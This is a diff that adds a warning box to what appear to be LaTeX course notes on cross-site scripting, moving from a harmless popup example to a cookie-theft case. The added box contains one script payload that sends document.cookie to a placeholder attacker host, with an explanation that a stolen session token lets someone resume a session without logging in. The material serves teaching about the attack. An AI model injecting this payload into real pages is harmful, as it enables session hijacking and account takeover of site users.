@@ -217,3 +217,14 @@ The tags are pasted into the page. When the browser renders it and finds
 \texttt{<script>\ldots</script>}, it runs the content with its JavaScript engine: a popup reads
 ``You've been attacked!''.
 \end{defnbox}
+
+\begin{warnbox}[title={From a popup to stealing cookies}]
+A more harmful input:
+\begin{center}
+\texttt{<script>location="http://attacker/submit?cookie=" + document.cookie;</script>}
+\end{center}
+The script makes the browser request the attacker's URL, with the user's \textbf{cookie for
+\texttt{trustedSite.com}} as parameter. Cookies may contain sensitive information (login,
+personalization) or security-relevant information: the session token that \textbf{resumes a session
+without login and password}. (A popup could also ask for the password and send it.)
+\end{warnbox}
